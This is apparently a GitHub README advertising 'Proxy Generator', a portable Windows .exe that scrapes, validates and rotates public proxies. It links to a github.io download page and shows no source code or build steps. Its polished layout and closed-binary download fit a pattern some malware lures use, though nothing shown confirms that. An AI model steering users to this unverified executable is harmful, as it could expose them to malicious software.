<div align="center">
<img src="assets/banner.png" width="100%" alt="Proxy Generator banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-4fe3e3?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-DC2626?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-9333EA?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=7C3AED&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%92%A1+Proxy+Rotator;%E2%9C%85+Ready+for+Windows;%E2%AD%90+Full+Feature+Suite;%E2%9C%A8+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=nodejs" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

<div align="center">

![Status](https://img.shields.io/badge/status-stable-brightgreen?style=plastic)
![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D4?style=plastic)
![License](https://img.shields.io/badge/license-MIT-lightgrey?style=plastic)
![Build](https://img.shields.io/badge/build-portable%20.exe-informational?style=plastic)
![Year](https://img.shields.io/badge/release-2026-orange?style=plastic)

</div>

---

Yes — it generates and rotates working proxies on demand, yes it works on residential and datacenter sources alike, yes it stays free and portable with zero runtime dependencies. Details live below, but the short version is: **Proxy Generator** is the desktop `.exe` that ends the "where do I get proxies that actually respond" loop for good.

## 📑 Table of Contents

- [Tips for best results](#-tips-for-best-results)
- [Get Started](#-get-started)
- [The Solution](#-the-solution)
- [How It Works](#-how-it-works)
- [Usage guidelines](#-usage-guidelines)
- [Compatibility](#-compatibility)
- [Comparison](#-comparison)
- [Hotkeys & Controls](#-hotkeys--controls)
- [The Problem](#-the-problem)
- [Module reference](#-module-reference)
- [Known Issues](#-known-issues)
- [FAQ](#-faq)

---

## 🧭 Tips for best results

- Run the `.exe` from a folder you own — not `Program Files`, not a synced OneDrive directory. Proxy Generator writes its working set (source caches, rotation logs, session tokens) next to itself.
- Start with **two or three sources enabled**, not all of them. A wide-open scrape on first launch floods the checker queue and you spend ten minutes staring at a spinner.
- Set a concurrency ceiling you can actually sustain. On a normal home connection, 40–60 simultaneous check threads is the sweet spot before your own router becomes the bottleneck.
- Feed it a source list you trust before you feed it a source list you scraped. The bundled public lists are a starting point, not a promise.
- Rotate on **fails**, not on a timer, unless you have a specific reason. Timer rotation burns good proxies to feel productive.
- Keep the log folder on a fast drive. The session log grows quickly once rotation is live and a slow disk makes the UI feel laggy even when it isn't.

## 🎬 Get Started

1. 🧾 Open the project page and grab the current build — no account, no installer, no sign-up wall.
2. 📂 Extract the archive to a folder you control (Desktop, `D:\tools`, wherever).
3. 🖱️ Double-click the `.exe`. That's it — no runtime, no redistributables, no first-run wizard.
4. 🧪 Hit **Source Manager**, enable one or two lists, then **Run Check** to seed the pool.
5. 🔁 Flip on **Auto-Rotate** and point your downstream tool at `127.0.0.1` on the local port shown in the status bar.
<div align="center">
  <a href="https://IguanaDominate.github.io/proxy-rotator/">
    <img src="https://img.shields.io/badge/GET-Proxy_Generator_2026-EA580C?style=flat&labelColor=C2410C" width="580" alt="GET Proxy Generator 2026"/>
  </a>
</div>
---

## 🧩 The Solution

| Problem | Solution |
| --- | --- |
| Public proxy lists are half dead before you finish reading them | Built-in checker validates every candidate before it ever enters the live pool |
| Manually pasting proxies into tools is a part-time job | Local rotating endpoint — one address, always fresh |
| Free lists rot within hours | Scheduled re-scrape + health scoring keeps the pool warm |
| You can't tell a fast proxy from a slow one until it fails | Latency and uptime scored per endpoint, sorted automatically |
| Different tools want different formats | One-click export to txt, json, csv, and full `host:port:user:pass` |
| Duplicate and dead entries everywhere | Dedup + quarantine before promotion, no repeats in rotation |
| No idea what's actually happening | Live log, per-source stats, and a real-time pool counter |

---

## ⚙️ How It Works

Proxy Generator runs as a single native process with a small embedded HTTP listener that acts as the rotating endpoint. At the core sits a **source manager** that pulls candidate endpoints from configured lists, feeds them into a **validation pipeline** where each candidate is scored on connect latency, handshake success, and response consistency, and then promotes survivors into a **live pool**. A **rotation engine** sits between the pool and the listener, choosing the next endpoint according to whatever policy you've selected — round-robin, least-recently-used, lowest-latency-first, or rotate-on-failure. Every request that passes through the listener is logged with its endpoint, timing, and outcome, and that log feeds back into the health scorer so a proxy that starts failing mid-session gets demoted automatically instead of hanging around as a landmine. Sources are re-scraped on a schedule you control, quarantined endpoints are periodically retried, and the whole thing persists its state to disk so a restart doesn't wipe the pool you spent twenty minutes building.

---

## 📜 Usage guidelines

| Allowed | Not allowed |
| --- | --- |
| Scraping public proxy lists for personal use | Using the tool to attack, DDoS, or flood any target |
| Rotating proxies for privacy, testing, and scraping your own endpoints | Circumventing rate limits on services you don't own |
| Validating and scoring proxy health locally | Reselling scraped proxies as your own product |
| Exporting proxy lists for your own tooling | Distributing the tool as part of malware or bundled installers |
| Testing your own infrastructure behind different exit IPs | Using proxies to evade lawful account bans or fraud detection |

> Proxy Generator is a utility for managing proxy sources and rotation. What you point it at is your responsibility — use it on infrastructure you own or have explicit permission to test.

---

## 🖥️ Compatibility

| Platform | Status | Notes |
| --- | --- | --- |
| Windows 11 (23H2+) | ✅ Fully supported | Primary target |
| Windows 10 (21H2+) | ✅ Fully supported | Tested on x64 |
| Windows Server 2019/2022 | ✅ Works | No GUI issues reported |
| Windows 8.1 | ⚠️ Untested | May work; no support |
| Linux / macOS | ❌ Not supported | Native `.exe` build only |
| Wine / Proton | ⚠️ Partial | Networking layer works, UI is flaky |

---

## 🆚 Comparison

| Aspect | Alternative | This Tool |
| --- | --- | --- |
| Distribution | Installer + account | Portable `.exe`, no signup |
| Dependencies | Python / Node runtime | Zero |
| Validation | Manual paste-and-pray | Automated scoring pipeline |
| Rotation modes | Round-robin only | Round-robin, LRU, latency-first, on-fail |
| Export formats | txt | txt, json, csv, `host:port:user:pass` |
| Source management | Paste a list | Named sources with per-source stats |
| Re-scrape schedule | Manual | Configurable, background |
| Health scoring | None | Per-endpoint uptime + latency |

---

## ⌨️ Hotkeys & Controls

| Key | Action | Notes |
| --- | --- | --- |
| `F5` | Run check on current pool | Re-validates all endpoints |
| `F6` | Start / stop rotation | Toggles the local listener |
| `F7` | Copy current endpoint | Copies `host:port` of active proxy |
| `Ctrl+S` | Export current pool | Opens export dialog |
| `Ctrl+L` | Open session log | Scrolls to live tail |
| `Ctrl+R` | Reload sources | Re-scrapes all enabled sources |
| `Esc` | Cancel running check | Leaves already-validated entries intact |
| `F1` | Open quick reference | Inline help overlay |

---

## 🩹 The Problem

- You find a "fresh proxy list," paste it in, and a third of the entries are dead before you finish pasting.
- Half the survivors are so slow that your requests time out before the proxy even handshakes.
- Every tool wants a different format, so you spend more time reformatting than working.
- You have no idea which proxies are still alive ten minutes later, so you rotate blindly.
- Free lists go stale on a schedule you can't see, and you find out the hard way.
- Running multiple sources means multiple lists, multiple formats, and no single pool to draw from.
- There's no feedback loop — nothing tells you a proxy started failing until your whole session breaks.

---

## 🧱 Module reference

### **Source management**

| Feature | Effect |
| --- | --- |
| Named source lists | Track each list separately with its own stats |
| Scheduled re-scrape | Keeps lists fresh without manual intervention |
| Source health stats | See which lists produce usable entries |
| Import from file / URL | Pull sources from disk or a remote list |
| Source enable/disable | Toggle lists without deleting them |

### **Validation & scoring**

| Feature | Effect |
| --- | --- |
| Multi-stage checker | Connect, handshake, and response consistency |
| Latency scoring | Ranks endpoints by measured response time |
| Uptime tracking | Flags endpoints that fail intermittently |
| Quarantine | Isolates suspect endpoints for retry |
| Configurable concurrency | Balance speed vs. your connection |
| Timeout tuning | Set per-stage thresholds |

### **Rotation engine**

| Feature | Effect |
| --- | --- |
| Round-robin policy | Even distribution across pool |
| Least-recently-used | Spreads load away from hot endpoints |
| Latency-first | Always picks the fastest live proxy |
| Rotate-on-failure | Swaps endpoint when a request fails |
| Sticky sessions | Optional per-session endpoint pinning |
| Local listener endpoint | Single address for downstream tools |

### **Export & integration**

| Feature | Effect |
| --- | --- |
| txt / json / csv export | Match whatever your tool expects |
| `host:port:user:pass` format | Direct paste into most clients |
| Clipboard shortcut | Copy active endpoint instantly |
| Session log export | Archive a rotation run |

### **Monitoring**

| Feature | Effect |
| --- | --- |
| Live pool counter | See how many endpoints are live right now |
| Per-source breakdown | Spot a broken source at a glance |
| Session log | Full request-by-request trail |
| Status bar | Endpoint, port, and rotation state always visible |

---

## 🚑 Troubleshooting flow

> **Pool stays empty after a check?** → Confirm at least one source is enabled → confirm the source URL or file path is reachable → lower concurrency and retry. If it still comes up empty, the source itself is dead; swap it.
>
> **Rotation "works" but downstream requests fail?** → Verify the downstream tool is pointed at `127.0.0.1` and the port shown in the status bar → confirm the tool supports HTTP proxies (not SOCKS-only) → check the session log for the failing endpoint and whether it's been quarantined.

---

## 🧨 Known Issues

| Issue | Workaround |
| --- | --- |
| Public source lists return zero results on first run | Try a different list; some sources go dark for days at a time. Enable two or three at once. |
| High concurrency causes the UI to stutter on older machines | Drop the checker thread count to 20–30. The bottleneck is the checker, not the UI. |
| Some HTTPS targets reject datacenter proxies | Expected — those proxies are flagged by the target. Mix in residential sources if your use case needs them. |
| Wine/Proton UI renders incorrectly | Run under a Windows VM instead. The networking layer works but the GUI is unreliable. |
| Log grows large on long sessions | Clear via the log panel or delete the log file; it's plain text. |
| Rotation feels slow after a few hours | Restart the listener (F6 twice) to flush the connection pool. |

---

## ❓ FAQ

**1. Does it actually generate proxies, or just collect them?**
It collects from sources you configure and validates them into a live pool. "Generator" in the name refers to the rotating endpoint it generates for you — one address that always resolves to a live proxy. If you want it to also scrape, that's the Source Manager's job.

**2. Does it work on Windows 10 and 11?**
Yes — both are fully supported, x64 builds. Windows Server 2019/2022 also works. It's a portable `.exe`, so there's no installer to fight with.

**3. Do I need Python, Node, or any runtime?**
No. The `.exe` is self-contained. Extract it, run it. That's the entire install story.

**4. Are the proxies free?**
The ones you scrape from public lists are free. Residential proxies usually aren't, and Proxy Generator doesn't sell or bundle any. You bring your own sources.

**5. Can I use it with my existing tool?**
Yes — point your tool at `127.0.0.1` and the port shown in the status bar. Most HTTP-aware tools work without modification.

**6. Why do some proxies die immediately after validation?**
Public proxies are volatile. The checker validates at a moment in time; the proxy can die a minute later. Health scoring demotes them, and rotate-on-failure handles the rest.

**7. Does it support SOCKS5?**
The local listener speaks HTTP. SOCKS support is on the roadmap, not in the current build.

**8. How do I update?**
Grab the newest `.exe` from the project page and replace the old one. Your source config and logs are kept next to the executable, so nothing's lost.

**9. Is it detectable?**
That's a question about the proxies, not the tool. Datacenter proxies are widely flagged; residential ones are not. Proxy Generator doesn't change what a proxy looks like to the target.

**10. What happens to my pool on restart?**
It persists to disk. You'll pick up where you left off, though endpoints will re-validate on next check.

---
<div align="center">
  <a href="https://IguanaDominate.github.io/proxy-rotator/">
    <img src="https://img.shields.io/badge/GET-Proxy_Generator_2026-EA580C?style=plastic&logo=download&logoColor=white&labelColor=C2410C" width="460" alt="GET Proxy Generator 2026"/>
  </a>
</div>
Proxy Generator exists because the proxy workflow was a mess of dead lists, mismatched formats, and blind rotation — and it didn't need to be. The current build is portable, dependency-free, and built around a validation pipeline that treats proxy health as something you measure, not something you hope for. If you've been running a folder full of half-tested lists and a rotation script you wrote at 2 a.m., this replaces both.
